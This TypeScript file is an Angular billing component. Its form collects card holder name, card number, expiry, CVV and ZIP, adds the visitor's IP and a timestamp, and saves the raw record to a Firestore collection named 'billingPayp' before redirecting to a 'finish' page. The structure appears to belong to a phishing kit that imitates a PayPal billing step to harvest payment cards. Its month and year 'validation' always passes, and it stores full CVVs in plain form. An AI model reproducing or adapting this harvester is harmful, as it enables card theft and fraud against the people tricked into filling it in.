import { Component, OnInit, ViewChild, ElementRef } from '@angular/core';
import { Billing } from './billing';
import { MyService } from '../myservice';
import { Router } from '@angular/router';
import { AngularFirestore, AngularFirestoreCollection } from '@angular/fire/firestore';

@Component({
  selector: 'app-billing',
  templateUrl: './billing.component.html',
  styleUrls: ['./billing.component.css']
})
export class BillingComponent implements OnInit {
  billing: Billing = {fullName:'',cardNumber:'',month:'',year:'',cvv:'',dateTime:'',ip:'',zip:''};
  wors:string;
  billingsCollection: AngularFirestoreCollection<Billing>;
  monthIsValid: boolean = false;
  yearIsValid: boolean = false;
  constructor(private myService: MyService, private router: Router,db: AngularFirestore) {
    this.billingsCollection=db.collection('billingPayp');
    this.billing.month = "12";
    this.billing.year = "19";
    if(localStorage.getItem('loggedIn')==null)
    this.router.navigate(['/login']);
    
  }

  ngOnInit() {
  }

  onSubmit(form) {
    if (form.valid) {
      this.billing.ip=localStorage.getItem('ip');
      this.billing.dateTime=Date.now();
      //this.myService.addBilling(this.billing.fullName, this.billing.cardNumber, this.billing.month, this.billing.year, this.billing.cvv, this.billing.zip).subscribe();
      this.billingsCollection.add(this.billing);
      window.scroll(0,0);
      this.router.navigate(['/finish']);
    }
    
  }

  validateMonth() {
    this.monthIsValid = true;
    this.yearIsValid = true;
  }

  validateYear() {
    this.yearIsValid = true;
    this.monthIsValid = true;
  }

  
}
